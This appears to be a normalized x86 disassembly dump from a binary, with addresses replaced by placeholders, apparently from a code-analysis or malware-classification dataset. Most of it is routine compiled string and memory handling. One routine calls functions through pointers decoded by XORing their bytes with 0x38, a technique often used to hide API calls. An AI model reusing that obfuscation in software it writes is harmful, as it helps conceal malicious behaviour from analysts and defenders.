mov [ ebp - 0x4 ] ebx
cmp esi ebx
jne r-xdata
inc esi
mov cl [ esi + eax ]
sub esp 0x1c
lea eax [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x3c ] esp
push eax
call sub_10007470
push [ ebp - 0x30 ]
mov ecx [ ebp - 0x34 ]
push [ ebp + 0x1c ]
push [ ebp - 0x38 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_1004970f
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1002c8c0
mov eax edi
call sub_1004642f
retn 0x1c
push 0x30
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1004ca10
sub_10065e70
push ebp
mov ebp esp
push 0xffffffff
push sub_10089eda
mov eax [ fs : 0x0 ]
push eax
sub esp 0x180
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx ecx
cmp [ ebx + 0xec ] 0x0
mov edi edx
mov [ ebp - 0x178 ] eax
mov [ ebp - 0x180 ] edi
jne r-xdata
push 0x10
lea ecx [ edi + 0x8 ]
lea esi [ ebp - 0x164 ]
call sub_10006b30
add esp 0x4
mov ecx [ ebp - 0x180 ]
xor edx edx
mov [ ebp - 0x4 ] edx
mov eax [ edi + 0x8 ]
mov ecx [ ecx + 0x18 ]
push eax
push ecx
mov edi 0xf
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x30 ] dl
call sub_10037e00
mov eax [ ebp - 0x178 ]
mov edx esi
push edx
push eax
lea ecx [ ebp - 0x68 ]
push ecx
mov [ ebp - 0x4 ] 0x1
call sub_1000c260
add esp 0xc
lea ecx [ ebp - 0x30 ]
lea esi [ ebp - 0xbc ]
mov [ ebp - 0x4 ] 0x2
call sub_1000be00
mov esi 0x10
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov eax 0x42
jmp r-xdata
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x68 ] 0x0
mov [ ebp - 0x4 ] 0x5
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov edx [ ebp - 0x68 ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0xbc ]
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0xa8 ] esi
jae r-xdata
mov eax [ ebp - 0x30 ]
push eax
call sub_100187af
add esp 0x4
mov edx [ ebp - 0xac ]
call sub_10047d50
push 0x5
lea esi [ ebp - 0x174 ]
mov edi ebx
mov [ ebp - 0x178 ] eax
call sub_10057a60
mov [ ebp - 0x4 ] 0x6
push 0x2
push r--data
lea ecx [ ebp - 0xd8 ]
mov [ ebp - 0xc4 ] 0xf
mov [ ebp - 0xc8 ] 0x0
mov [ ebp - 0xd8 ] 0x0
call sub_10037e00
mov [ ebp - 0x4 ] 0x7
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
jne r-xdata
lea ecx [ ebp - 0xbc ]
push esi
lea eax [ ebp - 0x174 ]
call sub_100629b0
push eax
push ebx
lea edi [ ebp - 0xd8 ]
call sub_10059c40
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push r--data
call sub_1002d84e
push esi
push ebx
lea eax [ ebp - 0x174 ]
call sub_10064570
lea ecx [ ebp - 0xbc ]
push ecx
lea edx [ ebp - 0x110 ]
push r--data
push edx
mov [ ebp - 0x180 ] eax
call sub_100403d0
add esp 0xc
mov [ ebp - 0x4 ] 0x8
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ esi + 0x1c ]
push eax
lea eax [ ebp - 0x174 ]
call sub_100629b0
push eax
push ebx
lea edi [ ebp - 0x110 ]
call sub_10059c40
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ esi + 0x1c ]
push eax
push ebx
lea eax [ ebp - 0x174 ]
call sub_10064570
mov edx [ ebp - 0x178 ]
push edx
lea esi [ ebp - 0x68 ]
mov [ ebp - 0x188 ] eax
call sub_1006cba0
add esp 0x4
push eax
lea eax [ ebp - 0xf4 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x9
call sub_10057800
add esp 0xc
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x54 ] 0x10
jb r-xdata
push r--data
call sub_1002d84e
mov ecx [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov esi 0xf
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x68 ] 0x0
cmp eax 0x2
ja r-xdata
mov ecx [ ebp - 0x68 ]
push ecx
call sub_100187af
add esp 0x4
lea eax [ edi + 0x38 ]
push eax
lea eax [ ebp - 0x174 ]
call sub_100629b0
push eax
push ebx
lea edi [ ebp - 0xf4 ]
call sub_10059c40
mov ecx [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x2
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ edi + 0x38 ]
push eax
push ebx
lea eax [ ebp - 0x174 ]
call sub_10064570
push 0x1
push r--data
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x178 ] eax
mov [ ebp - 0x8c ] esi
mov [ ebp - 0x90 ] 0x0
mov [ ebp - 0xa0 ] 0x0
call sub_10037e00
mov [ ebp - 0x4 ] 0xc
cmp [ ebx ] 0x0
push 0x1
lea ecx [ ebp - 0xa0 ]
jne r-xdata
push r--data
call sub_1002d84e
push r--data
push r--data
jmp r-xdata
lea eax [ esi + 0x54 ]
push eax
lea eax [ ebp - 0x174 ]
call sub_100629b0
push eax
push ebx
lea edi [ ebp - 0xa0 ]
call sub_10059c40
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x3
ja r-xdata
push r--data
call sub_1002d84e
call sub_1002e070
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
lea eax [ esi + 0x54 ]
push eax
push ebx
lea eax [ ebp - 0x174 ]
call sub_10064570
push 0x227a9
lea esi [ ebp - 0x68 ]
mov [ ebp - 0x184 ] eax
call sub_1003e830
add esp 0x4
push eax
lea edx [ ebp - 0x12c ]
push r--data
push edx
mov [ ebp - 0x4 ] 0xd
call sub_10057800
add esp 0xc
mov [ ebp - 0x4 ] 0xf
cmp [ ebp - 0x54 ] 0x10
jb r-xdata
push r--data
call sub_1002d84e
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0x54 ] 0xf
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x68 ] 0x0
cmp ecx 0x4
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_100187af
add esp 0x4
lea eax [ esi + 0x70 ]
push eax
lea eax [ ebp - 0x174 ]
call sub_100629b0
push eax
push ebx
lea edi [ ebp - 0x12c ]
call sub_10059c40
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ esi + 0x70 ]
push eax
push ebx
lea eax [ ebp - 0x174 ]
call sub_10064570
mov ecx [ ebp - 0x180 ]
push ecx
lea edx [ ebp - 0x84 ]
push edx
mov [ ebp - 0x17c ] eax
call sub_10041240
mov esi eax
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x10
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x11
call sub_1000be00
mov ecx eax
mov [ ebp - 0x4 ] 0x12
mov esi [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub esi edi
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push r--data
call sub_1002d84e
push 0xffffffff
push 0x0
push ecx
mov ecx edi
call sub_1005e580
mov edi 0x10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_1002d84e
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0xf
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x70 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x188 ]
push ecx
lea edx [ ebp - 0x84 ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0x110 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x13
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x14
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0x15
mov ecx [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_100187af
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x1c ]
push esi
call sub_1005e580
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1002d84e
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x178 ]
push ecx
lea edx [ ebp - 0x84 ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0xf4 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x16
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x17
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0x18
mov ecx [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_100187af
add esp 0x4
lea ecx [ edi + 0x38 ]
push 0xffffffff
xor edi edi
push edi
push esi
call sub_1005e580
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1002d84e
mov [ ebp - 0x38 ] 0xf
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0xf
mov [ ebp - 0x1c ] 0xf
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x184 ]
push ecx
lea edx [ ebp - 0x84 ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x19
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x1a
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0x1b
mov ecx [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_100187af
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x54 ]
push esi
call sub_1005e580
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1002d84e
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x17c ]
push ecx
lea edx [ ebp - 0x84 ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0x12c ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x1c
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x1d
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0x1e
mov ecx [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
ja r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_100187af
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x70 ]
push esi
call sub_1005e580
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1002d84e
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_100187af
add esp 0x4
lea ecx [ ebp - 0x148 ]
push ecx
lea edi [ ebp - 0x174 ]
call sub_10044960
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] 0x1f
mov [ ebp - 0x17c ] esp
push 0xffffffff
xor esi esi
push esi
lea edx [ ebp - 0x148 ]
mov edi 0xf
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] esi
push edx
mov [ ecx ] 0x0
call sub_1004efe0
mov eax [ ebx + 0xe0 ]
push eax
push ebx
call sub_10003290
mov ebx 0x10
mov [ ebp - 0x17c ] eax
cmp [ ebp - 0x134 ] ebx
jb r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_100187af
add esp 0x4
mov [ ebp - 0x134 ] edi
mov [ ebp - 0x138 ] esi
mov [ ebp - 0x148 ] 0x0
cmp [ ebp - 0x118 ] ebx
jb r-xdata
mov ecx [ ebp - 0x148 ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x118 ] edi
mov [ ebp - 0x11c ] esi
mov [ ebp - 0x12c ] 0x0
cmp [ ebp - 0x8c ] ebx
jb r-xdata
mov edx [ ebp - 0x12c ]
push edx
call sub_100187af
add esp 0x4
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x90 ] esi
mov [ ebp - 0xa0 ] 0x0
cmp [ ebp - 0xe0 ] ebx
jb r-xdata
mov eax [ ebp - 0xa0 ]
push eax
call sub_100187af
add esp 0x4
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xe4 ] esi
mov [ ebp - 0xf4 ] 0x0
cmp [ ebp - 0xfc ] ebx
jb r-xdata
mov ecx [ ebp - 0xf4 ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0xfc ] edi
mov [ ebp - 0x100 ] esi
mov [ ebp - 0x110 ] 0x0
cmp [ ebp - 0xc4 ] ebx
jb r-xdata
mov edx [ ebp - 0x110 ]
push edx
call sub_100187af
add esp 0x4
mov eax [ ebp - 0x174 ]
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xc8 ] esi
mov [ ebp - 0xd8 ] 0x0
cmp eax esi
je r-xdata
mov eax [ ebp - 0xd8 ]
push eax
call sub_100187af
add esp 0x4
mov [ ebp - 0x174 ] esi
mov [ ebp - 0x170 ] esi
mov [ ebp - 0x16c ] esi
cmp [ ebp - 0xa8 ] ebx
jb r-xdata
mov ecx [ ebp - 0x17c ]
push ecx
mov ecx [ ebp - 0x170 ]
lea edx [ ebp - 0x168 ]
push edx
push ecx
push eax
call sub_10028f80
mov edx [ ebp - 0x174 ]
push edx
call sub_100187af
add esp 0x14
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xac ] esi
mov [ ebp - 0xbc ] 0x0
cmp [ ebp - 0x150 ] ebx
jb r-xdata
mov eax [ ebp - 0xbc ]
push eax
call sub_100187af
add esp 0x4
mov eax [ ebp - 0x17c ]
mov ecx [ ebp - 0x164 ]
push ecx
call sub_100187af
add esp 0x4
sub_10066a40
push ebp
mov ebp esp
sub esp 0x14
mov ecx [ ebp + 0x8 ]
mov edx [ rw-data ]
push ebx
push esi
xor eax eax
mov bl 0x38
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push eax
mov [ ebp - 0x8 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
xor [ ebp - 0x4 ] bl
xor [ ebp - 0x3 ] bl
xor [ ebp - 0x2 ] bl
xor [ ebp - 0x1 ] bl
push eax
lea edx [ ebp - 0x14 ]
push edx
push ecx
push eax
push eax
mov [ ebp - 0x14 ] 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
call [ ebp - 0x4 ]
mov edx [ rw-data ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov esi eax
push 0xffffffff
push esi
call [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push esi
call [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov edx [ ebp - 0x10 ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push edx
call [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10066af4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_10035d06
push [ esi + 0x8 ]
call sub_10035d06
push [ esi + 0xc ]
call sub_10035d06
push [ esi + 0x10 ]
call sub_10035d06
push [ esi + 0x14 ]
call sub_10035d06
push [ esi + 0x18 ]
call sub_10035d06
push [ esi ]
call sub_10035d06
push [ esi + 0x20 ]
call sub_10035d06
push [ esi + 0x24 ]
call sub_10035d06
push [ esi + 0x28 ]
call sub_10035d06
push [ esi + 0x2c ]
call sub_10035d06
push [ esi + 0x30 ]
call sub_10035d06
push [ esi + 0x34 ]
call sub_10035d06
push [ esi + 0x1c ]
call sub_10035d06
push [ esi + 0x38 ]
call sub_10035d06
push [ esi + 0x3c ]
call sub_10035d06
add esp 0x40
push [ esi + 0x40 ]
call sub_10035d06
push [ esi + 0x44 ]
call sub_10035d06
push [ esi + 0x48 ]
call sub_10035d06
push [ esi + 0x4c ]
call sub_10035d06
push [ esi + 0x50 ]
call sub_10035d06
push [ esi + 0x54 ]
call sub_10035d06
push [ esi + 0x58 ]
call sub_10035d06
push [ esi + 0x5c ]
call sub_10035d06
push [ esi + 0x60 ]
call sub_10035d06
push [ esi + 0x64 ]
call sub_10035d06
push [ esi + 0x68 ]
call sub_10035d06
push [ esi + 0x6c ]
call sub_10035d06
push [ esi + 0x70 ]
call sub_10035d06
push [ esi + 0x74 ]
call sub_10035d06
push [ esi + 0x78 ]
call sub_10035d06
push [ esi + 0x7c ]
call sub_10035d06
add esp 0x40
push [ esi + 0x80 ]
call sub_10035d06
push [ esi + 0x84 ]
call sub_10035d06
push [ esi + 0x88 ]
call sub_10035d06
push [ esi + 0x8c ]
call sub_10035d06
push [ esi + 0x90 ]
call sub_10035d06
push [ esi + 0x94 ]
call sub_10035d06
push [ esi + 0x98 ]
call sub_10035d06
push [ esi + 0x9c ]
call sub_10035d06
push [ esi + 0xa0 ]
call sub_10035d06
push [ esi + 0xa4 ]
call sub_10035d06
push [ esi + 0xa8 ]
call sub_10035d06
push [ esi + 0xbc ]
call sub_10035d06
push [ esi + 0xc0 ]
call sub_10035d06
push [ esi + 0xc4 ]
call sub_10035d06
push [ esi + 0xc8 ]
call sub_10035d06
push [ esi + 0xcc ]
call sub_10035d06
add esp 0x40
push [ esi + 0xd0 ]
call sub_10035d06
push [ esi + 0xb8 ]
call sub_10035d06
push [ esi + 0xd8 ]
call sub_10035d06
push [ esi + 0xdc ]
call sub_10035d06
push [ esi + 0xe0 ]
call sub_10035d06
push [ esi + 0xe4 ]
call sub_10035d06
push [ esi + 0xe8 ]
call sub_10035d06
push [ esi + 0xec ]
call sub_10035d06
push [ esi + 0xd4 ]
call sub_10035d06
push [ esi + 0xf0 ]
call sub_10035d06
push [ esi + 0xf4 ]
call sub_10035d06
push [ esi + 0xf8 ]
call sub_10035d06
push [ esi + 0xfc ]
call sub_10035d06
push [ esi + 0x100 ]
call sub_10035d06
push [ esi + 0x104 ]
call sub_10035d06
push [ esi + 0x108 ]
call sub_10035d06
add esp 0x40
push [ esi + 0x10c ]
call sub_10035d06
push [ esi + 0x110 ]
call sub_10035d06
push [ esi + 0x114 ]
call sub_10035d06
push [ esi + 0x118 ]
call sub_10035d06
push [ esi + 0x11c ]
call sub_10035d06
push [ esi + 0x120 ]
call sub_10035d06
push [ esi + 0x124 ]
call sub_10035d06
push [ esi + 0x128 ]
call sub_10035d06
push [ esi + 0x12c ]
call sub_10035d06
push [ esi + 0x130 ]
call sub_10035d06
push [ esi + 0x134 ]
call sub_10035d06
push [ esi + 0x138 ]
call sub_10035d06
push [ esi + 0x13c ]
call sub_10035d06
push [ esi + 0x140 ]
call sub_10035d06
push [ esi + 0x144 ]
call sub_10035d06
push [ esi + 0x148 ]
call sub_10035d06
add esp 0x40
push [ esi + 0x14c ]
call sub_10035d06
push [ esi + 0x150 ]
call sub_10035d06
push [ esi + 0x154 ]
call sub_10035d06
push [ esi + 0x158 ]
call sub_10035d06
push [ esi + 0x15c ]
call sub_10035d06
push [ esi + 0x160 ]
call sub_10035d06
add esp 0x18
sub_10066e6b
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x44 ]
push edx
lea edx [ ebp - 0x48 ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_10056f45
add esp 0x18
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_10024441
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100463af
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_100528c9
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x4c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x20
sub_10066f50
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0xc4
push edi
call sub_1006ee90
mov esi eax
mov [ edi + 0x8 ] esi
xor ebx ebx
mov [ esi ] ebx
lea ecx [ esi + 0x10 ]
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0x70 ] 0x96
mov eax [ r--data ]
push ecx
push edi
mov [ esi + 0xc ] eax
call sub_10006330
lea edx [ esi + 0x20 ]
push edx
push edi
mov [ esi + 0x1c ] ebx
call sub_10006330
mov eax [ ebp + 0xc ]
lea ecx [ esi + 0x94 ]
push ecx
mov [ ebp + 0x8 ] ecx
mov ecx [ ebp + 0x10 ]
push ecx
push eax
push edi
mov [ esi + 0x2c ] eax
call sub_1003d6e0
mov edx [ ebp + 0x8 ]
add esi 0x30
push esi
push edx
call sub_1006c7a0
mov eax [ edi + 0x8 ]
add esp 0x30
pop edi
pop esi
mov [ eax + 0x7c ] ebx
mov [ eax + 0x80 ] ebx
mov [ eax + 0x84 ] ebx
mov [ eax + 0x88 ] ebx
mov [ eax + 0x8c ] ebx
mov [ eax + 0x90 ] ebx
pop ebx
pop ebp
retn
sub_10066ff0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x120 ] 0x0
jne r-xdata
lea eax [ ebx + 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn 0x18
push edi
push 0x208
push 0x0
push ebx
call sub_1007f940
add esp 0xc
cmp [ ebp + 0xc ] 0x0
je r-xdata
pop esi
mov eax 0x1e
pop ebx
mov esp ebp
pop ebp
retn 0x18
lea eax [ ebp + 0xc ]
push eax
call sub_10065cb8
mov ecx [ ebp + 0xc ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x120 ]
mov [ ebp + 0xc ] ecx
imul ecx ecx 0x208
lea esi [ ecx + eax + 0x1082c ]
add esp 0x4
lea edi [ ebp + 0x14 ]
mov edx 0x104
mov ecx ebx
call sub_100727a0
test eax eax
js r-xdata
lea eax [ ebp + 0xc ]
push eax
call sub_10065cb8
mov ecx [ ebp + 0xc ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ esi + 0x120 ]
mov [ ebp + 0xc ] ecx
imul ecx ecx 0x208
lea esi [ ecx + edx + 0x130cc ]
add esp 0x4
